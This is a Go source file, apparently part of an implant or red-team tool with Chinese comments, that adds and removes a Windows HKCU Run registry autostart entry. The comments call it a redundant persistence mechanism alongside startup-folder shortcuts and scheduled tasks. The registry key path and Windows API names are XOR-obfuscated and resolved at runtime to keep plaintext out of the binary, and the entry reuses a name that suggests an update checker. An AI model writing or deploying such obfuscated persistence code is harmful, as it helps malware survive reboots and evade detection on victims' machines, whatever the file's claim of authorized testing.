//go:build windows

package cmd

// 注册表自启动(HKCU Run 键):与启动文件夹快捷方式互为冗余,提高持久化可靠性。
// API 名称与键路径均 XOR 混淆、运行时解析,二进制中不出现明文。
// 仅用于经授权的测试环境。

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	// HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	runKeyPath = x("\x34\x5f\x0a\x45\x19\x2a\x41\x1c\x3b\x7d\x05\x52\x1c\x24\x40\x16\x01\x44\x30\x66\x07\x25\x57\x16\x10\x43\x30\x72\x1b\x39\x41\x1c\x09\x44\x3a\x54\x1c\x38\x5a\x16\x09\x6c\x3e\x44\x00")
	// 自启动项名称,与快捷方式/计划任务共用 updateCheckName(见 persist_windows.go)
	runValueName = updateCheckName
)

const (
	hkeyCurrentUser = 0x80000001 // HKEY_CURRENT_USER
	keySetValue     = 0x0002     // KEY_SET_VALUE
	regSz           = 1          // REG_SZ
)

var (
	pRegOpen   uintptr
	pRegSetVal uintptr
	pRegDelVal uintptr
	pRegClose  uintptr
)

func init() {
	pRegOpen = procAddr(advapi32, x("\x35\x55\x0b\x7e\x1e\x2e\x5d\x32\x02\x49\x29\x49\x39"))           // RegOpenKeyExW
	pRegSetVal = procAddr(advapi32, x("\x35\x55\x0b\x62\x0b\x3f\x65\x18\x0b\x45\x09\x74\x16\x1c"))     // RegSetValueExW
	pRegDelVal = procAddr(advapi32, x("\x35\x55\x0b\x75\x0b\x27\x56\x0d\x02\x66\x0d\x5d\x1b\x2e\x64")) // RegDeleteValueW
	pRegClose = procAddr(advapi32, x("\x35\x55\x0b\x72\x02\x24\x40\x1c\x2c\x55\x15"))                  // RegCloseKey
}

// setRunKey 向 HKCU Run 键写入自启动项,值为 `"目标路径" 参数`
func setRunKey(value string) error {
	var k syscall.Handle
	pathPtr, err := syscall.UTF16PtrFromString(runKeyPath)
	if err != nil {
		return err
	}
	r, _, e := callProc(pRegOpen, hkeyCurrentUser,
		uintptr(unsafe.Pointer(pathPtr)), 0, keySetValue, uintptr(unsafe.Pointer(&k)))
	if e != 0 || r != 0 {
		return fmt.Errorf("RegOpenKeyExW failed: %v (0x%x)", e, r)
	}
	defer callProcDiscard(pRegClose, uintptr(k))

	namePtr, err := syscall.UTF16PtrFromString(runValueName)
	if err != nil {
		return err
	}
	data, err := syscall.UTF16FromString(value)
	if err != nil {
		return err
	}
	r, _, e = callProc(pRegSetVal, uintptr(k),
		uintptr(unsafe.Pointer(namePtr)), 0, regSz,
		uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)*2))
	if e != 0 || r != 0 {
		return fmt.Errorf("RegSetValueExW failed: %v (0x%x)", e, r)
	}
	return nil
}

// deleteRunKey 删除 Run 键中的自启动项,不存在时视为成功
func deleteRunKey() error {
	var k syscall.Handle
	pathPtr, err := syscall.UTF16PtrFromString(runKeyPath)
	if err != nil {
		return err
	}
	r, _, e := callProc(pRegOpen, hkeyCurrentUser,
		uintptr(unsafe.Pointer(pathPtr)), 0, keySetValue, uintptr(unsafe.Pointer(&k)))
	if e != 0 || r != 0 {
		return fmt.Errorf("RegOpenKeyExW failed: %v (0x%x)", e, r)
	}
	defer callProcDiscard(pRegClose, uintptr(k))

	namePtr, err := syscall.UTF16PtrFromString(runValueName)
	if err != nil {
		return err
	}
	r, _, e = callProc(pRegDelVal, uintptr(k), uintptr(unsafe.Pointer(namePtr)))
	// RegDeleteValueW 以返回值(而非 GetLastError)报告状态:2 = ERROR_FILE_NOT_FOUND
	if e == syscall.ERROR_FILE_NOT_FOUND || r == uintptr(syscall.ERROR_FILE_NOT_FOUND) {
		return nil
	}
	if e != 0 || r != 0 {
		return fmt.Errorf("RegDeleteValueW failed: %v (0x%x)", e, r)
	}
	return nil
}
